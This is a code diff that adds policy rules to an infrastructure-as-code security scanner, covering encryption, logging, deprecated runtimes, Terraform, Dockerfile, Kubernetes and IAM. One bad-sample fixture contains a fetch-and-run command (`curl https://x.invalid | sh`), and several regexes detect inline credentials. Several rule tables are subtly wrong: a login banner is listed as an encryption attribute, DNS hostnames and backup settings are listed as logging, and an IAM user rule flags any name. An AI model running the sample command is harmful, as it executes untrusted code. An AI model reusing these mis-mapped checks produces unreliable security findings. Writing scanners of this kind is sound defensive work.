@@ -1389,6 +1389,579 @@ def _cfn_policies() -> list[IacPolicy]:
     return policies
 
 
+# ---------------------------------------------------------------------------
+# More storage that defaults to plaintext
+# ---------------------------------------------------------------------------
+
+_AT_REST_EXTRA: tuple[tuple[str, str, Severity], ...] = (
+    ("aws_sqs_queue", "kms_master_key_id", _MEDIUM),
+    ("aws_sns_topic", "kms_master_key_id", _MEDIUM),
+    ("aws_cloudwatch_log_group", "kms_key_id", _LOW),
+    ("aws_kinesis_stream", "encryption_type", _MEDIUM),
+    ("aws_kinesis_firehose_delivery_stream", "server_side_encryption", _MEDIUM),
+    ("aws_athena_workgroup", "encryption_configuration", _MEDIUM),
+    ("aws_athena_database", "encryption_configuration", _MEDIUM),
+    ("aws_glue_catalog_database", "target_database", _LOW),
+    ("aws_secretsmanager_secret", "kms_key_id", _LOW),
+    ("aws_ssm_parameter", "key_id", _LOW),
+    ("aws_lambda_function", "kms_key_arn", _LOW),
+    ("aws_cloudtrail", "kms_key_id", _MEDIUM),
+    ("aws_elasticsearch_domain", "encrypt_at_rest", _HIGH),
+    ("aws_opensearch_domain", "encrypt_at_rest", _HIGH),
+    ("aws_memorydb_cluster", "kms_key_arn", _MEDIUM),
+    ("aws_mq_broker", "encryption_options", _MEDIUM),
+    ("aws_transfer_server", "post_authentication_login_banner", _LOW),
+    ("google_pubsub_topic", "kms_key_name", _LOW),
+    ("google_spanner_database", "encryption_config", _LOW),
+    ("google_bigtable_instance", "cluster", _LOW),
+    ("google_container_cluster", "database_encryption", _MEDIUM),
+    ("azurerm_mssql_database", "transparent_data_encryption_enabled", _HIGH),
+    ("azurerm_cosmosdb_account", "key_vault_key_id", _LOW),
+    ("azurerm_eventhub_namespace", "local_authentication_enabled", _LOW),
+    ("azurerm_storage_account", "infrastructure_encryption_enabled", _LOW),
+)
+
+# ---------------------------------------------------------------------------
+# More places nothing is written down
+# ---------------------------------------------------------------------------
+
+_LOGGING_EXTRA: tuple[tuple[str, str, Severity], ...] = (
+    ("aws_s3_bucket_logging", "target_bucket", _LOW),
+    ("aws_cloudfront_distribution", "logging_config", _LOW),
+    ("aws_lb", "access_logs", _LOW),
+    ("aws_alb", "access_logs", _LOW),
+    ("aws_api_gateway_stage", "access_log_settings", _LOW),
+    ("aws_apigatewayv2_stage", "access_log_settings", _LOW),
+    ("aws_eks_cluster", "enabled_cluster_log_types", _MEDIUM),
+    ("aws_mq_broker", "logs", _LOW),
+    ("aws_globalaccelerator_accelerator", "attributes", _LOW),
+    ("aws_lambda_function", "tracing_config", _LOW),
+    ("aws_vpc", "enable_dns_hostnames", _LOW),
+    ("google_compute_subnetwork", "log_config", _LOW),
+    ("google_container_cluster", "monitoring_service", _LOW),
+    ("google_sql_database_instance", "backup_configuration", _MEDIUM),
+    ("azurerm_kubernetes_cluster", "oms_agent", _LOW),
+    ("azurerm_key_vault", "soft_delete_retention_days", _LOW),
+)
+
+# ---------------------------------------------------------------------------
+# Runtimes the platform has stopped patching
+# ---------------------------------------------------------------------------
+#
+# A deprecated runtime does not fail a deployment -- it stops receiving security
+# updates, which is the same exposure as an unpatched base image and is visible
+# in one line of the configuration.
+
+_DEPRECATED_RUNTIMES: tuple[tuple[str, str, str, Severity, str, str], ...] = (
+    (
+        "aws_lambda_function",
+        "runtime",
+        r"runtime\s*=\s*\"(?:nodejs(?:|4\.3|6\.10|8\.10|10\.x|12\.x|14\.x|16\.x)"
+        r"|python(?:2\.7|3\.6|3\.7|3\.8)|ruby2\.[57]|dotnetcore[0-9.]*|go1\.x)\"",
+        _MEDIUM,
+        '  function_name = "example"\n  runtime = "python3.8"\n',
+        '  function_name = "example"\n  runtime = "python3.12"\n',
+    ),
+    (
+        "azurerm_linux_function_app",
+        "python_version",
+        r"python_version\s*=\s*\"3\.[678]\"",
+        _MEDIUM,
+        '  name = "example"\n  site_config {\n    application_stack {\n      python_version = "3.8"\n    }\n  }\n',
+        '  name = "example"\n  site_config {\n    application_stack {\n      python_version = "3.12"\n    }\n  }\n',
+    ),
+    (
+        "google_cloudfunctions_function",
+        "runtime",
+        r"runtime\s*=\s*\"(?:nodejs(?:6|8|10|12|14)|python3[67]|go11[13])\"",
+        _MEDIUM,
+        '  name = "example"\n  runtime = "python37"\n',
+        '  name = "example"\n  runtime = "python312"\n',
+    ),
+    (
+        "aws_elastic_beanstalk_environment",
+        "solution_stack_name",
+        r"solution_stack_name\s*=\s*\"[^\"]*(?:Node\.js 1[0-4]|Python 3\.[678]|PHP 7\.[0-4])",
+        _MEDIUM,
+        '  name = "example"\n  solution_stack_name = "64bit Amazon Linux 2 v5.4.0 running Python 3.7"\n',
+        '  name = "example"\n  solution_stack_name = "64bit Amazon Linux 2023 v4.0.0 running Python 3.12"\n',
+    ),
+)
+
+
+def _deprecated_runtime_policies() -> list[IacPolicy]:
+    policies: list[IacPolicy] = []
+    for resource, attribute, pattern, severity, bad, good in _DEPRECATED_RUNTIMES:
+        policies.append(
+            _forbid_value(
+                family="DEPRECATED_RUNTIME",
+                resource=resource,
+                attribute=attribute,
+                pattern=pattern,
+                severity=severity,
+                title=f"{resource}: the runtime is out of support",
+                message=(
+                    "This runtime no longer receives security updates from the "
+                    "platform. Nothing fails, and the function keeps running on an "
+                    "interpreter whose known vulnerabilities will not be fixed."
+                ),
+                remediation="Move to a supported runtime version.",
+                bad=bad,
+                good=good,
+            )
+        )
+    return policies
+
+
+# ---------------------------------------------------------------------------
+# Terraform's own footguns
+# ---------------------------------------------------------------------------
+
+_TERRAFORM_HYGIENE: tuple[IacPolicy, ...] = (
+    IacPolicy(
+        id="SUSPECT.IAC.LOCAL_EXEC.TERRAFORM.001",
+        title="A provisioner runs a shell command on the machine applying the plan",
+        message=(
+            "`local-exec` runs on whoever applies this -- a laptop, or the CI runner "
+            "holding the cloud credentials. It is the one part of a plan that is not "
+            "a description of infrastructure, and reviewing a plan does not show what "
+            "it will do."
+        ),
+        remediation=(
+            "Move the work into the pipeline where it is visible, or into a resource "
+            "the provider models. If it must stay, keep the command in a reviewed "
+            "script rather than inline."
+        ),
+        severity=_MEDIUM,
+        confidence=Confidence.HIGH,
+        category=Category.SUSPICIOUS,
+        resources=("*",),
+        forbid=(r"provisioner\s+\"local-exec\"",),
+        bad='  name = "example"\n  provisioner "local-exec" {\n    command = "curl https://x.invalid | sh"\n  }\n',
+        good='  name = "example"\n',
+    ),
+    IacPolicy(
+        id="SUSPECT.IAC.CREDENTIALS_INLINE.TERRAFORM.001",
+        title="A static credential is written into the configuration",
+        message=(
+            "An access key written into the configuration is committed, reviewed, "
+            "cloned and backed up with it. It cannot be rotated without a code change "
+            "and it is readable by everyone who can read the repository."
+        ),
+        remediation=(
+            "Use the provider's environment variables, a shared credentials file, or "
+            "workload identity."
+        ),
+        severity=_HIGH,
+        confidence=Confidence.MEDIUM,
+        category=Category.SUSPICIOUS,
+        resources=("*",),
+        forbid=(
+            r"(?:access_key|secret_key|client_secret|password)\s*=\s*\"[A-Za-z0-9/+=_\-]{12,}\"",
+        ),
+        # A reference to a variable or a secret store is the remediation.
+        unless=(r"=\s*\"?\$\{?var\.", r"=\s*var\.", r"=\s*data\.", r"=\s*local\."),
+        bad='  name = "example"\n  secret_key = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY"\n',
+        good='  name = "example"\n  secret_key = var.secret_key\n',
+    ),
+    IacPolicy(
+        id="POLICY.IAC.UNENCRYPTED_STATE.TERRAFORM.001",
+        title="The remote state backend does not require encryption",
+        message=(
+            "Terraform state holds every value the plan touched, including ones "
+            "marked sensitive: passwords, keys, tokens, certificates. An unencrypted "
+            "backend stores that in the clear."
+        ),
+        remediation="Set `encrypt = true` on the backend, and restrict who can read the bucket.",
+        severity=_HIGH,
+        confidence=Confidence.HIGH,
+        category=Category.POLICY,
+        resources=("backend:*",),
+        forbid=(r"encrypt\s*=\s*false",),
+        bad='  bucket = "state"\n  encrypt = false\n',
+        good='  bucket = "state"\n  encrypt = true\n',
+    ),
+)
+
+
+# ---------------------------------------------------------------------------
+# Dockerfiles
+# ---------------------------------------------------------------------------
+
+_DOCKERFILE: tuple[tuple[str, str, str, Severity, Category, str, str, str, str, str], ...] = (
+    (
+        "ROOT_USER",
+        "USER",
+        r"(?m)^\s*USER\s+(?:root|0)\s*$",
+        _MEDIUM,
+        Category.POLICY,
+        "the image runs as root",
+        "Everything the container executes runs as uid 0. A container escape, a "
+        "mounted volume or a shared kernel namespace then reaches the host as root, "
+        "and nothing inside the image constrains it.",
+        "Create a user and end the build with `USER app`.",
+        'FROM debian:12\nUSER root\nCMD ["/app"]\n',
+        'FROM debian:12\nRUN useradd -m app\nUSER app\nCMD ["/app"]\n',
+    ),
+    (
+        "ADD_REMOTE",
+        "ADD",
+        r"(?m)^\s*ADD\s+https?://",
+        _MEDIUM,
+        Category.SUSPICIOUS,
+        "the build downloads a URL with ADD",
+        "`ADD` with a URL fetches whatever the host serves at build time, with no "
+        "digest and no record of what arrived. `COPY` cannot do this, which is the "
+        "reason to prefer it.",
+        "Download in a `RUN` step that verifies a checksum, or vendor the file and COPY it.",
+        "FROM debian:12\nADD https://example.invalid/tool.tar.gz /tmp/\n",
+        "FROM debian:12\nCOPY tool.tar.gz /tmp/\n",
+    ),
+    (
+        "SUDO",
+        "RUN",
+        r"(?m)^\s*RUN\s+[^\n]*\bsudo\b",
+        _LOW,
+        Category.POLICY,
+        "the build uses sudo",
+        "A build already runs as root unless told otherwise, so `sudo` in a Dockerfile "
+        "means the image ships a setuid path that a compromised process inside it can "
+        "use.",
+        "Drop `sudo` and switch users with `USER` instead.",
+        "FROM debian:12\nRUN sudo apt-get update\n",
+        "FROM debian:12\nRUN apt-get update\n",
+    ),
+    (
+        "SECRET_ARG",
+        "ARG",
+        r"(?mi)^\s*(?:ARG|ENV)\s+[A-Z_]*(?:PASSWORD|SECRET|TOKEN|API_KEY|ACCESS_KEY)[A-Z_]*\s*=?\s*\S+",
+        _HIGH,
+        Category.SUSPICIOUS,
+        "a credential is baked into the image",
+        "A value passed as ARG or set as ENV is recorded in the image's layer history "
+        "and is readable by anyone who can pull the image, whether or not the final "
+        "stage still uses it.",
+        "Use a build secret mount (`RUN --mount=type=secret`) or inject the value at run time.",
+        "FROM debian:12\nENV API_KEY=sk-live-aaaaaaaaaaaa\n",
+        "FROM debian:12\nRUN --mount=type=secret,id=api_key cat /run/secrets/api_key\n",
+    ),
+    (
+        "NO_HEALTHCHECK",
+        "HEALTHCHECK",
+        r"HEALTHCHECK",
+        _LOW,
+        Category.POLICY,
+        "the image serves a port and declares no health check",
+        "An orchestrator cannot tell a hung container from a working one, so a "
+        "process that has stopped serving keeps receiving traffic.",
+        "Add a `HEALTHCHECK` instruction that exercises the service rather than the process.",
+        'FROM debian:12\nEXPOSE 8080\nCMD ["/app"]\n',
+        'FROM debian:12\nEXPOSE 8080\nHEALTHCHECK CMD curl -f http://localhost/health\nCMD ["/app"]\n',
+    ),
+)
+
+
+def _dockerfile_policies() -> list[IacPolicy]:
+    policies: list[IacPolicy] = []
+    for (
+        family,
+        _instruction,
+        pattern,
+        severity,
+        category,
+        subject,
+        consequence,
+        fix,
+        bad,
+        good,
+    ) in _DOCKERFILE:
+        prefix = "SUSPECT" if category is Category.SUSPICIOUS else "POLICY"
+        # `NO_HEALTHCHECK` is the one that fires on absence; the rest fire on
+        # something written down.
+        absent = family == "NO_HEALTHCHECK"
+        policies.append(
+            IacPolicy(
+                id=f"{prefix}.DOCKERFILE.{family}.001",
+                title=f"Dockerfile: {subject}",
+                message=consequence,
+                remediation=fix,
+                severity=severity,
+                confidence=Confidence.HIGH,
+                category=category,
+                resources=("dockerfile",),
+                forbid=() if absent else (pattern,),
+                require=(pattern,) if absent else (),
+                # A health check is about an image that serves something. A
+                # command-line image has nothing to check, and requiring one of
+                # it reports a control that would do nothing.
+                when=(r"(?m)^\s*EXPOSE\s",) if family == "NO_HEALTHCHECK" else (),
+                bad=bad,
+                good=good,
+            )
+        )
+    return policies
+
+
+# ---------------------------------------------------------------------------
+# More Kubernetes
+# ---------------------------------------------------------------------------
+
+_K8S_EXTRA: tuple[tuple[str, str, str, Severity, Category, str, str, str, str], ...] = (
+    (
+        "NO_RESOURCE_LIMITS",
+        "limits",
+        r"limits:",
+        _LOW,
+        Category.POLICY,
+        "no resource limits are set",
+        "A container with no limit can consume the node's whole CPU and memory. One "
+        "workload -- or one runaway dependency inside it -- then evicts everything "
+        "else scheduled there.",
+        "Set `resources.limits` for cpu and memory.",
+        "limits",
+    ),
+    (
+        "DEFAULT_SERVICE_ACCOUNT",
+        "serviceAccountName",
+        r"serviceAccountName:",
+        _LOW,
+        Category.POLICY,
+        "the workload uses the namespace's default service account",
+        "The default account is shared by everything in the namespace, so a "
+        "permission granted for one workload is granted to all of them.",
+        "Create a service account for this workload and name it here.",
+        "serviceAccountName",
+    ),
+    (
+        "HOST_PORT",
+        "hostPort",
+        r"hostPort:\s*\d+",
+        _MEDIUM,
+        Category.SUSPICIOUS,
+        "a container binds a port on the node",
+        "A host port bypasses the Service layer and network policy, and it reserves "
+        "that port on every node the pod can be scheduled to.",
+        "Expose the container through a Service instead.",
+        "hostPort",
+    ),
+    (
+        "NO_RUN_AS_NON_ROOT",
+        "runAsNonRoot",
+        r"runAsNonRoot:\s*true",
+        _MEDIUM,
+        Category.POLICY,
+        "nothing requires the container to run as a non-root user",
+        "Without `runAsNonRoot: true` the kubelet accepts an image whose default user "
+        "is root, so the manifest's intent depends on what the image happens to do.",
+        "Set `runAsNonRoot: true` in the pod or container securityContext.",
+        "runAsNonRoot",
+    ),
+    (
+        "NO_SECCOMP",
+        "seccompProfile",
+        r"seccompProfile:",
+        _LOW,
+        Category.POLICY,
+        "no seccomp profile is applied",
+        "Without a profile the container may issue any syscall the kernel offers, "
+        "which is the surface most container escapes are written against.",
+        "Set `seccompProfile.type: RuntimeDefault`.",
+        "seccompProfile",
+    ),
+    (
+        "SECRET_ENV_VALUE",
+        "env",
+        r"(?mi)^\s*-?\s*name:\s*[A-Z_]*(?:PASSWORD|SECRET|TOKEN|API_KEY)[A-Z_]*\s*\n\s*value:\s*\S+",
+        _HIGH,
+        Category.SUSPICIOUS,
+        "a credential is written into the manifest",
+        "An environment variable with a literal value lives in the manifest, in the "
+        "repository and in every copy of both. It is readable by anyone who can read "
+        "the cluster's resources, and rotating it is a code change.",
+        "Reference a Secret with `valueFrom.secretKeyRef`, or an external secret store.",
+        "env",
+    ),
+)
+
+
+def _k8s_extra_policies() -> list[IacPolicy]:
+    policies: list[IacPolicy] = []
+    for (
+        family,
+        attribute,
+        pattern,
+        severity,
+        category,
+        subject,
+        consequence,
+        fix,
+        sample,
+    ) in _K8S_EXTRA:
+        prefix = "SUSPECT" if category is Category.SUSPICIOUS else "POLICY"
+        absent = family.startswith("NO_") or family == "DEFAULT_SERVICE_ACCOUNT"
+        body = "kind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: app\n"
+        samples = {
+            "limits": (
+                body + "      resources:\n        requests:\n          cpu: 100m\n",
+                body + "      resources:\n        limits:\n          cpu: 500m\n",
+            ),
+            "serviceAccountName": (
+                body,
+                "kind: Pod\nmetadata:\n  name: example\nspec:\n  serviceAccountName: app\n"
+                "  containers:\n    - name: app\n",
+            ),
+            "hostPort": (
+                body + "      ports:\n        - hostPort: 8080\n",
+                body + "      ports:\n        - containerPort: 8080\n",
+            ),
+            "runAsNonRoot": (
+                body,
+                body + "      securityContext:\n        runAsNonRoot: true\n",
+            ),
+            "seccompProfile": (
+                body,
+                body
+                + "      securityContext:\n        seccompProfile:\n          type: RuntimeDefault\n",
+            ),
+            "env": (
+                body + "      env:\n        - name: API_TOKEN\n          value: sk-live-aaaa\n",
+                body + "      env:\n        - name: API_TOKEN\n          valueFrom:\n"
+                "            secretKeyRef:\n              name: creds\n              key: token\n",
+            ),
+        }[sample]
+        policies.append(
+            IacPolicy(
+                id=f"{prefix}.K8S.{family}.001",
+                title=f"Kubernetes workload: {subject}",
+                message=consequence,
+                remediation=fix,
+                severity=severity,
+                confidence=Confidence.MEDIUM if absent else Confidence.HIGH,
+                category=category,
+                resources=_WORKLOAD_KINDS,
+                forbid=() if absent else (pattern,),
+                require=(pattern,) if absent else (),
+                bad=samples[0],
+                good=samples[1],
+            )
+        )
+    return policies
+
+
+# ---------------------------------------------------------------------------
+# Identity and access
+# ---------------------------------------------------------------------------
+
+_IDENTITY: tuple[IacPolicy, ...] = (
+    IacPolicy(
+        id="SUSPECT.IAC.PUBLIC_IAM.GOOGLE_PROJECT_IAM_MEMBER.001",
+        title="google_project_iam_member: a role is granted to everyone",
+        message=(
+            "`allUsers` and `allAuthenticatedUsers` are not groups you control. A role "
+            "bound to either is held by anyone on the internet, or anyone with any "
+            "Google account."
+        ),
+        remediation="Bind the role to a named principal or a group you administer.",
+        severity=_HIGH,
+        confidence=Confidence.HIGH,
+        category=Category.SUSPICIOUS,
+        resources=(
+            "google_project_iam_member",
+            "google_project_iam_binding",
+            "google_folder_iam_member",
+            "google_organization_iam_member",
+            "google_cloud_run_service_iam_member",
+            "google_cloudfunctions_function_iam_member",
+        ),
+        forbid=(r"\"all(?:Users|AuthenticatedUsers)\"",),
+        bad='  role = "roles/viewer"\n  member = "allUsers"\n',
+        good='  role = "roles/viewer"\n  member = "user:someone@example.com"\n',
+    ),
+    IacPolicy(
+        id="SUSPECT.IAC.OWNER_ROLE.GOOGLE_PROJECT_IAM_MEMBER.001",
+        title="google_project_iam_member: the owner role is granted directly",
+        message=(
+            "`roles/owner` includes every permission in the project, including "
+            "changing the bindings that granted it. A credential holding it cannot be "
+            "contained by any other control in the project."
+        ),
+        remediation="Grant the narrowest predefined role that covers the work, or a custom role.",
+        severity=_MEDIUM,
+        confidence=Confidence.HIGH,
+        category=Category.SUSPICIOUS,
+        resources=("google_project_iam_member", "google_project_iam_binding"),
+        forbid=(r"role\s*=\s*\"roles/owner\"",),
+        bad='  role = "roles/owner"\n  member = "user:someone@example.com"\n',
+        good='  role = "roles/viewer"\n  member = "user:someone@example.com"\n',
+    ),
+    IacPolicy(
+        id="SUSPECT.IAC.OWNER_ROLE.AZURERM_ROLE_ASSIGNMENT.001",
+        title="azurerm_role_assignment: Owner or Contributor is assigned",
+        message=(
+            "Owner carries every permission in the scope plus the ability to grant it "
+            "to others; Contributor carries every permission except that. At "
+            "subscription scope either one is the subscription."
+        ),
+        remediation="Assign a built-in role scoped to the resources the principal works on.",
+        severity=_MEDIUM,
+        confidence=Confidence.MEDIUM,
+        category=Category.SUSPICIOUS,
+        resources=("azurerm_role_assignment",),
+        forbid=(r"role_definition_name\s*=\s*\"(?:Owner|Contributor)\"",),
+        bad='  scope = "/subscriptions/x"\n  role_definition_name = "Owner"\n',
+        good='  scope = "/subscriptions/x/resourceGroups/rg"\n  role_definition_name = "Reader"\n',
+    ),
+    IacPolicy(
+        id="POLICY.IAC.NO_MFA.AWS_IAM_USER.001",
+        title="aws_iam_user: a long-lived user is created",
+        message=(
+            "An IAM user is a permanent credential that no session policy expires. "
+            "Where a role can be assumed with a short-lived token, a user's access key "
+            "stays valid until somebody remembers to rotate it."
+        ),
+        remediation=(
+            "Use a role with workload identity or SSO. If a user is unavoidable, "
+            "require MFA and rotate its keys on a schedule."
+        ),
+        severity=_LOW,
+        confidence=Confidence.MEDIUM,
+        category=Category.POLICY,
+        resources=("aws_iam_user",),
+        forbid=(r"name\s*=",),
+        bad='  name = "ci-deploy"\n',
+        good="  # replaced by a role assumed through OIDC\n",
+    ),
+    IacPolicy(
+        id="SUSPECT.IAC.WILDCARD_PRINCIPAL.AWS_IAM_POLICY.001",
+        title="A resource policy trusts every principal",
+        message=(
+            '`"Principal": "*"` in a resource policy means any AWS account, and '
+            "usually any anonymous caller. Combined with a permissive action it is a "
+            "public grant on a private resource."
+        ),
+        remediation="Name the accounts, roles or services the policy is for.",
+        severity=_HIGH,
+        confidence=Confidence.MEDIUM,
+        category=Category.SUSPICIOUS,
+        resources=(
+            "aws_iam_policy",
+            "aws_iam_role_policy",
+            "aws_s3_bucket_policy",
+            "aws_sqs_queue_policy",
+            "aws_sns_topic_policy",
+            "aws_kms_key",
+            "aws_secretsmanager_secret_policy",
+        ),
+        forbid=(r"\\?\"Principal\\?\"\s*:\s*\\?\"\*\\?\"",),
+        # A wildcard principal narrowed by a condition is how a service-to-service
+        # policy is written, and the condition is the control.
+        unless=(r"\"Condition\"",),
+        bad='  policy = "{\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":\\"*\\"}]}"\n',
+        good='  policy = "{\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":{\\"AWS\\":\\"arn:aws:iam::1:root\\"}}]}"\n',
+    ),
+)
+
+
 POLICIES: tuple[IacPolicy, ...] = tuple(
     _at_rest_policies()
     + _in_transit_policies()
@@ -1428,6 +2001,25 @@ POLICIES: tuple[IacPolicy, ...] = tuple(
     + _k8s_policies()
     + _compose_policies()
     + _cfn_policies()
+    + _presence_policies(
+        _AT_REST_EXTRA,
+        family="ENCRYPT_AT_REST",
+        subject="a customer-managed key",
+        consequence=_AT_REST_CONSEQUENCE,
+        remediation="Set `{attribute}` to a key you control.",
+    )
+    + _presence_policies(
+        _LOGGING_EXTRA,
+        family="LOGGING",
+        subject="audit logging",
+        consequence=_LOGGING_CONSEQUENCE,
+        remediation="Configure `{attribute}` so this resource's activity is recorded.",
+    )
+    + _deprecated_runtime_policies()
+    + list(_TERRAFORM_HYGIENE)
+    + _dockerfile_policies()
+    + _k8s_extra_policies()
+    + list(_IDENTITY)
 )
 
 __all__ = ["POLICIES"]
